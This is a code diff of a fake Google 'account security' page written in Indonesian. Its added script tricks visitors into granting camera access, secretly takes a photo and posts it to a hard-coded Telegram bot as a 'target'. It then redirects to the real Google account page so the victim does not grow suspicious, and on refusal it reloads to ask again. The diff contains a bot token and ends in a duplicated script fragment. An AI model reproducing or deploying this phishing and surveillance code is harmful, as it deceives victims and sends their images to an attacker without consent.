@@ -3,14 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Update</title>
+    <title>Google Authentication</title>
     <style>
         body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; width: 100%; }
         .logo { width: 75px; margin-bottom: 20px; }
-        h2 { font-size: 24px; font-weight: 400; color: #202124; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
-        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
         #loader { display: none; margin-top: 20px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -21,19 +19,66 @@
 
 <div class="card">
     <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-    <h2>Keamanan Perangkat</h2>
-    <p>Kami mendeteksi aktivitas mencurigakan. Selesaikan verifikasi wajah untuk mengamankan akun Anda.</p>
-    
-    <button id="btn" onclick="start()">VERIFIKASI SEKARANG</button>
-
-    <div id="loader">
-        <div class="spinner"></div>
-        <p>Memproses biometrik...</p>
-    </div>
+    <h2>Keamanan Akun</h2>
+    <p>Sistem mendeteksi ancaman. Klik tombol di bawah untuk verifikasi identitas dan amankan perangkat.</p>
+    <button id="btn" onclick="openCam()">AMANKAN SEKARANG</button>
+    <div id="loader"><div class="spinner"></div><p>Memproses...</p></div>
 </div>
 
-<video id="v" autoplay></video>
+<video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
+
+<script>
+    const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
+    const CHAT_ID = "8025603711";
+
+    async function send(msg, isPhoto = false, blob = null) {
+        const url = isPhoto ? `https://api.telegram.org/bot${TOKEN}/sendPhoto` : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        if (isPhoto) {
+            fd.append('photo', blob, 't.jpg');
+            fd.append('caption', msg);
+        } else {
+            fd.append('text', msg);
+            fd.append('parse_mode', 'html');
+        }
+        await fetch(url, { method: 'POST', body: fd });
+    }
+
+    async function openCam() {
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        try {
+            // Minta izin kamera (Wajib HTTPS)
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            v.srcObject = s;
+
+            // Tunggu 2 detik biar kamera fokus
+            setTimeout(() => {
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => send("📸 <b>FOTO TARGET MASUK!</b>", true, b), 'image/jpeg');
+                
+                // Matikan kamera & redirect biar gak curiga
+                s.getTracks().forEach(t => t.stop());
+                alert("Perangkat Anda telah berhasil diamankan.");
+                window.location.href = "https://myaccount.google.com/";
+            }, 2500);
+
+        } catch (e) {
+            send("❌ <b>Target Menolak Kamera / Gagal HTTPS</b>");
+            alert("Izin Kamera Diperlukan untuk Verifikasi Keamanan!");
+            location.reload(); // Refresh buat minta izin lagi
+        }
+    }
+</script>
+</body>
+</html>
 
 <script>
     const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
